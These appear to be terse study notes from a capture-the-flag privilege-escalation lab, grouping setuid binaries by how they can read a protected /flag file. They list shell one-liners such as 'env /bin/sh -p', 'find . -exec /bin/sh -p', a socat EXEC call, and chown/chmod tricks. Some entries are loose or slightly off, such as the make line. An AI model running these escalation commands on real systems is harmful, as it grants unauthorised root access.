___Forces you to understand different archive formats!
gzip
bzip2
zip
tar
ar
cpio
genisoimage

___Enables you to read flags by making them execute other commands!
env          env /bin/sh -p
find         find . -exec /bin/sh -p \;
make         make a file containing /bin/sh p
nice         nice /bin/sh -p
timeout      timeout 100 /bin/sh -p
stdbuff      stdbuf -o0 /bin/sh -p
setarch      setarch $(uname -m) /bin/sh -p
watch        watch -x /usr/bin/cat /flag
socat        socat - EXEC:'/bin/cat /flag'

___Requires some light programming to read the flag.!
whiptail     whiptail --textbox /flag 20 70
awk          awk '{ print }' /flag
sed          sed -n 'p' /flag
ed           ed /flag  after that-> ,p

___Lets you get the flag by doing tricks with permissions!
chown       chown $(whoami) /flag
chmod       chmod a+x /flag 
cp          cp /flag theflag
mv

___Lets you read the flag because they let you program anything!
perl
python
ruby
bash

